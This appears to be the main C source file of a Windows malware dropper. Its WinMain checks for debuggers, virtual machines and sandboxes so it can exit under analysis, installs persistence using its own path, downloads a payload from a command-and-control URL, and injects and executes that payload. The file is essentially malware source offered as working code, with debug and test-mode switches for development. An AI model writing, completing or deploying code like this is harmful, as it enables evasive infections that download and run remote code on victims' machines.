#include "config.h"
#include <windows.h>
#include <stdio.h>
#include "evasion.h"
#include "persistence.h"
#include "network.h"
#include "injection.h"

// if "DEBUG" flag is appended by compiler, print on screen
// else, preprocessor deletes the line
#ifdef DEBUG
    #define DEBUG_PRINT(fmt, ...) printf("[*] " fmt "\n", ##__VA_ARGS__)
#else
    #define DEBUG_PRINT(fmt, ...)
#endif

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    DEBUG_PRINT("Starting dropper...");

    // 1. EVASION
    DEBUG_PRINT("Executing Evasion Checks...");
    
    DEBUG_PRINT(" -> Checking Mutex...");
    if (!check_mutex()) {
        DEBUG_PRINT("[!] Mutex exists. Exit.");
        return 0;
    }

    // if TEST_MODE is on, these checks are skipped in compilation
#ifndef TEST_MODE
    DEBUG_PRINT(" -> Checking system resources...");
    if (!check_resources()) {
        DEBUG_PRINT("[!] Dynamic analysis detected. Exit.");
        return 0;
    }

    DEBUG_PRINT(" -> Checking Debugger, Uptime and VM...");
    if (!check_debugger() || !check_uptime() || !check_vm()) {
        DEBUG_PRINT("[!] Dynamic analysis detected. Exit.");
        return 0;
    }

    DEBUG_PRINT(" -> Smart Delay in progress...");
    smart_delay();
#else
    DEBUG_PRINT("[!] TEST_MODE Active: Anti-Analysis and Smart Delay checks bypassed.");
#endif

    // 2. PERSISTENCE
    DEBUG_PRINT("Installing Persistence...");
    char my_path[MAX_PATH];
    GetModuleFileNameA(NULL, my_path, MAX_PATH);
    install_persistence(my_path);

    // 3. DOWNLOAD PAYLOAD
    #ifdef DEBUG
    // instantiating the stack string locally for debug printing purposes only
    C2_URL(debug_url, debug_len);
    DEBUG_PRINT("Downloading payload from: %s", debug_url);
    #endif

    SIZE_T payload_size = 0;
    char* payload = download_payload(&payload_size);

    if (payload == NULL) {
        DEBUG_PRINT("[!] Payload download error.");
        return 0;
    }
    
    DEBUG_PRINT("Payload downloaded successfully (%zu bytes).", payload_size);

    // 4. EXECUTE
    DEBUG_PRINT("Starting Injection...");
    execute_payload(payload, payload_size);
    DEBUG_PRINT("Injection complete. The Dropper has finished its work.");

    return 0;
}